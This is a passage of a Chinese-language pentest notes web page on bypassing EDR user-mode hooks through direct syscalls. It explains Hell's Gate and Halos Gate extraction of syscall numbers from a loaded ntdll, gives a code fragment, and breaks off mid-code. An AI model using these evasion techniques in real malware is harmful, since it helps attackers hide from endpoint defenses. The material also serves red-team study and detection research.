<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="3. 调用syscall实现用户态Hook绕过 # 在上个小节，我们主要是通过对 ntdll 模块进行覆盖或者补丁来移除 hook 实现用户态 hook 的绕过。但是这些方法涉及到对 ntdll 的纂改，以及对内存权限的修改，具有一定的风险。实际上，我们还有其他途径来实现 hook 的绕过。
提取 syscall 号码 # 我们可以在 C 项目里定义汇编函数，来实现 NTAPI。我们知道，只需要最少 4 条指令，我们便能成功执行 syscall。但在执行 syscall 之前，我们需要获得目标函数的 SSN。我们可以从磁盘中读取一份干净的 ntdll 并解析得到 SSN，但从磁盘中读取 ntdll 会显得有些可疑，因此最好是解析载入的 ntdll 并设法获得 SSN。
Hells Gate # Hells Gate 通过 PEB Walking 的方法得到加载的 ntdll 地址以及想要获得 SSN 的函数地址。通过对关键字节的比较来确定这是一个有效的 syscall stub，从而提取出 SSN。其实上个小节我们已经用了这个逻辑了。
原始代码关键部分如下：
if (*((PBYTE)pFunctionAddress &#43; cw) == 0x4c &amp;&amp; *((PBYTE)pFunctionAddress &#43; 1 &#43; cw) == 0x8b &amp;&amp; *((PBYTE)pFunctionAddress &#43; 2 &#43; cw) == 0xd1 &amp;&amp; *((PBYTE)pFunctionAddress &#43; 3 &#43; cw) == 0xb8 &amp;&amp; *((PBYTE)pFunctionAddress &#43; 6 &#43; cw) == 0x00 &amp;&amp; *((PBYTE)pFunctionAddress &#43; 7 &#43; cw) == 0x00) { BYTE high = *((PBYTE)pFunctionAddress &#43; 5 &#43; cw); BYTE low = *((PBYTE)pFunctionAddress &#43; 4 &#43; cw); pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low; break; } 但是，如果要搜索的函数被 hook 了，那么 SSN 可能不会存在于 syscall stub 里(取决于是什么 EDR 以及覆盖了哪些指令)，这样的话，就不能成功获得 ssn 了。因此，Halos Gate 对此进行了改善。">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/%E5%85%B6%E4%BB%96/Hooking/3.%E8%B0%83%E7%94%A8syscall%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E6%80%81Hook%E7%BB%95%E8%BF%87/">
  <meta property="og:site_name" content="Pentest Notes">
  <meta property="og:title" content="Pentest Notes">
  <meta property="og:description" content="3. 调用syscall实现用户态Hook绕过 # 在上个小节，我们主要是通过对 ntdll 模块进行覆盖或者补丁来移除 hook 实现用户态 hook 的绕过。但是这些方法涉及到对 ntdll 的纂改，以及对内存权限的修改，具有一定的风险。实际上，我们还有其他途径来实现 hook 的绕过。
提取 syscall 号码 # 我们可以在 C 项目里定义汇编函数，来实现 NTAPI。我们知道，只需要最少 4 条指令，我们便能成功执行 syscall。但在执行 syscall 之前，我们需要获得目标函数的 SSN。我们可以从磁盘中读取一份干净的 ntdll 并解析得到 SSN，但从磁盘中读取 ntdll 会显得有些可疑，因此最好是解析载入的 ntdll 并设法获得 SSN。
Hells Gate # Hells Gate 通过 PEB Walking 的方法得到加载的 ntdll 地址以及想要获得 SSN 的函数地址。通过对关键字节的比较来确定这是一个有效的 syscall stub，从而提取出 SSN。其实上个小节我们已经用了这个逻辑了。
原始代码关键部分如下：
if (*((PBYTE)pFunctionAddress &#43; cw) == 0x4c &amp;amp;&amp;amp; *((PBYTE)pFunctionAddress &#43; 1 &#43; cw) == 0x8b &amp;amp;&amp;amp; *((PBYTE)pFunctionAddress &#43; 2 &#43; cw) == 0xd1 &amp;amp;&amp;amp; *((PBYTE)pFunctionAddress &#43; 3 &#43; cw) == 0xb8 &amp;amp;&amp;amp; *((PBYTE)pFunctionAddress &#43; 6 &#43; cw) == 0x00 &amp;amp;&amp;amp; *((PBYTE)pFunctionAddress &#43; 7 &#43; cw) == 0x00) { BYTE high = *((PBYTE)pFunctionAddress &#43; 5 &#43; cw); BYTE low = *((PBYTE)pFunctionAddress &#43; 4 &#43; cw); pVxTableEntry-&amp;gt;wSystemCall = (high &amp;lt;&amp;lt; 8) | low; break; } 但是，如果要搜索的函数被 hook 了，那么 SSN 可能不会存在于 syscall stub 里(取决于是什么 EDR 以及覆盖了哪些指令)，这样的话，就不能成功获得 ssn 了。因此，Halos Gate 对此进行了改善。">
  <meta property="og:locale" content="zh-cn">
  <meta property="og:type" content="article">
  <meta property="article:section" content="docs">
<title>3.调用syscall实现用户态 Hook绕过 | Pentest Notes</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/favicon.png" >
<link rel="canonical" href="http://localhost:1313/docs/%E5%85%B6%E4%BB%96/Hooking/3.%E8%B0%83%E7%94%A8syscall%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E6%80%81Hook%E7%BB%95%E8%BF%87/">
<link rel="stylesheet" href="/book.min.599079e474050c6bea85d1008bc631728c5ad956088cb0958f2056ed345f0196.css" integrity="sha256-WZB55HQFDGvqhdEAi8Yxcoxa2VYIjLCVjyBW7TRfAZY=" crossorigin="anonymous">
  <script defer src="/flexsearch.min.js"></script>
  <script defer src="/en.search.min.be3cb6062ad734487c8dd12d9a0644f0e72a4160ed8d460fa6f4cbb2c2b005a6.js" integrity="sha256-vjy2BirXNEh8jdEtmgZE8OcqQWDtjUYPpvTLssKwBaY=" crossorigin="anonymous"></script>

  

<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><span>Pentest Notes</span>
  </a>
</h2>


<div class="book-search">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>












  



  
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Amass/" class="">Amass</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Linux%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="">Linux内部信息收集</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F/" class="">主机扫描</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F/" class="">子域名扫描</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" class="">定时任务</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/" class="">目录扫描</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/Hooking/1.%E7%94%A8%E6%88%B7%E6%80%81Hooking%E4%BB%8B%E7%BB%8D/" class="">1.用户态 Hooking介绍</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/Hooking/2.%E7%BB%95%E8%BF%87%E7%94%A8%E6%88%B7%E6%80%81Hooking/" class="">2.绕过用户态 Hooking</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/Hooking/3.%E8%B0%83%E7%94%A8syscall%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E6%80%81Hook%E7%BB%95%E8%BF%87/" class="active">3.调用syscall实现用户态 Hook绕过</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/HVV%E9%9D%A2%E8%AF%95/" class="">Hvv面试</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/" class="">解决ubuntu Crontab反弹shell失败的问题</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/ADSEC101/" class="">Adsec101</a>
  

        </li>
      
    
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/Kerbrute/" class="">Kerbrute</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/KeyTab/" class="">Key Tab</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/runas/" class="">Runas</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/Windows%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="">Windows内部信息收集</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/%E5%B1%80%E5%9F%9F%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="">局域网信息收集</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/IPC/" class="">IP C</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99/" class="">相关资料</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/" class="">代理转发</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" class="">容器逃逸</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86/" class="">密码收集</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/" class="">扫描工具</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/" class="">文件传输</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%9B%B8%E5%85%B3%E6%96%87%E7%AB%A0/" class="">相关文章</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/CS%E9%9A%90%E5%8C%BF/CobaltStrike&#43;CDN/" class="">Cobalt Strike Cdn</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/PHP%E5%86%85%E5%AD%98%E9%A9%AC/" class="">Php内存马</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/WebShell%E5%85%8D%E6%9D%80/" class="">Web Shell免杀</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/" class="">免杀</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/" class="">Linux提权</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/MySQL%E6%8F%90%E6%9D%83/" class="">My Sql提权</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/SQLServer%E6%8F%90%E6%9D%83/" class="">SQL Server提权</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E8%BF%9C%E6%8E%A7/%E4%BC%98%E5%8C%96shell/" class="">优化shell</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/Java/Fastjson/" class="">Fastjson</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/Java/Shiro/" class="">Shiro</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/pear&#43;register_argc_argv%E5%88%A9%E7%94%A8/" class="">Pear Register Argc Argv利用</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="">Php伪协议</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%86%85%E7%BD%AE%E7%B1%BB/" class="">Php内置类</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="">Php反序列化漏洞</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="">Php命令执行</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%9F%BA%E7%A1%80/" class="">Php基础</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E7%89%B9%E6%80%A7%E5%A4%A7%E5%85%A8%E4%B8%8D%E5%AE%8C%E6%95%B4/" class="">Php特性大全（不完整</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" class="">无参数 Rce</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/SSRF/" class="">Ssrf</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/SSTI/PHP-Twig/" class="">Php Twig</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/SSTI/SSTI/" class="">Ssti</a>
  

        </li>
      
    
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/WordPress/" class="">Word Press</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="">信息泄露</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" class="">命令执行绕过</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/NoSQLi/" class="">No Sqli</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/SQLi/" class="">Sqli</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/SQLi%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/" class="">Sqli过滤绕过</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/sqlmap%E8%84%9A%E6%9C%AC/" class="">Sqlmap脚本</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/%E5%90%84%E7%89%88%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%AD%E5%8F%A5/" class="">各版本数据库语句</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/HTTP_content-type_%E5%AF%B9%E7%85%A7%E8%A1%A8/" class="">HTTP Content Type 对照表</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="">文件上传</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1/" class="">日志审计</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/motd/" class="">Motd</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/MySQL/" class="">My SQL</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/Redis/" class="">Redis</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/smb/" class="">Smb</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/VNC/" class="">Vnc</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/webdav/" class="">Webdav</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/3.FUZZ/FUZZ/" class="">Fuzz</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/3.FUZZ/%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/" class="">爆破工具</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%A1%E8%AE%A1/CodeQL-Java/" class="">Code Ql Java</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%A1%E8%AE%A1/SQL%E6%B3%A8%E5%85%A5/" class="">Sql注入</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP%E5%AE%A1%E8%AE%A1/SQL%E6%B3%A8%E5%85%A5/" class="">Sql注入</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%B7%A5%E5%85%B7/" class="">工具</a>
  

        </li>
      
    
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/5.%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7/searchsploit/" class="">Searchsploit</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E7%BA%A2%E9%98%9F%E8%A1%8C%E5%8A%A8/%E7%BA%A2%E9%98%9F%E9%9D%A2%E8%AF%95/" class="">红队面试</a>
  

        </li>
      
    
  </ul>















</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>3.调用syscall实现用户态 Hook绕过</strong>

  <label for="toc-control">
    
    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  
<nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#提取-syscall-号码"><strong>提取 syscall 号码</strong></a></li>
        <li><a href="#直接调用-syscall"><strong>直接调用 Syscall</strong></a></li>
        <li><a href="#间接调用-syscall"><strong>间接调用 Syscall</strong></a></li>
        <li><a href="#突变之门-mutationgate"><strong>突变之门 MutationGate</strong></a></li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown book-article"><h1 id="3-调用syscall实现用户态hook绕过">
  3. 调用syscall实现用户态Hook绕过
  <a class="anchor" href="#3-%e8%b0%83%e7%94%a8syscall%e5%ae%9e%e7%8e%b0%e7%94%a8%e6%88%b7%e6%80%81hook%e7%bb%95%e8%bf%87">#</a>
</h1>
<p>在上个小节，我们主要是通过对 ntdll 模块进行覆盖或者补丁来移除 hook 实现用户态 hook 的绕过。但是这些方法涉及到对 ntdll 的纂改，以及对内存权限的修改，具有一定的风险。实际上，我们还有其他途径来实现 hook 的绕过。</p>
<h3 id="提取-syscall-号码">
  <strong>提取 syscall 号码</strong>
  <a class="anchor" href="#%e6%8f%90%e5%8f%96-syscall-%e5%8f%b7%e7%a0%81">#</a>
</h3>
<p>我们可以在 C 项目里定义汇编函数，来实现 NTAPI。我们知道，只需要最少 4 条指令，我们便能成功执行 syscall。但在执行 syscall 之前，我们需要获得目标函数的 SSN。我们可以从磁盘中读取一份干净的 ntdll 并解析得到 SSN，但从磁盘中读取 ntdll 会显得有些可疑，因此最好是解析载入的 ntdll 并设法获得 SSN。</p>
<h4 id="hells-gate">
  <strong>Hells Gate</strong>
  <a class="anchor" href="#hells-gate">#</a>
</h4>
<p>Hells Gate 通过 PEB Walking 的方法得到加载的 ntdll 地址以及想要获得 SSN 的函数地址。通过对关键字节的比较来确定这是一个有效的 syscall stub，从而提取出 SSN。其实上个小节我们已经用了这个逻辑了。</p>
<p>原始代码关键部分如下：</p>
<pre tabindex="0"><code>if (*((PBYTE)pFunctionAddress + cw) == 0x4c
     &amp;&amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
     &amp;&amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
     &amp;&amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
     &amp;&amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
     &amp;&amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
     BYTE high = *((PBYTE)pFunctionAddress + 5 + cw); 
     BYTE low = *((PBYTE)pFunctionAddress + 4 + cw); 
     pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low;
     break;
}
</code></pre><p>但是，如果要搜索的函数被 hook 了，那么 SSN 可能不会存在于 syscall stub 里(取决于是什么 EDR 以及覆盖了哪些指令)，这样的话，就不能成功获得 ssn 了。因此，Halos Gate 对此进行了改善。</p>
<h4 id="halos-gate">
  <strong>Halos Gate</strong>
  <a class="anchor" href="#halos-gate">#</a>
</h4>
<p>我们发现，在 ntdll 里，随着地址的增高，NTAPI 的 SSN 是递增的，反之则递减。因此，如果我们想要搜索的 NTAPI 被 hook 了，可以向上和向下同时继续搜索，例如往下搜索了 <strong>2 跳</strong>发现了一个未被 hook 的 NTAPI，那么要搜索的 NTAPI 的 SSN 就是这个未被 hook 的 NTAPI 的 SSN 再减去 2，即 <strong>Desired_SSN = Clean_SSN - Hop</strong>。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324155723.png" alt="20240324155723" /></p>
<p>关键代码部分如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> GoUp <span style="color:#f92672">-</span><span style="color:#ae81ff">32</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> GoDown <span style="color:#ae81ff">32</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// If the first instruction of the syscall is a an inconditional jump (aka it&#39;s hooked)
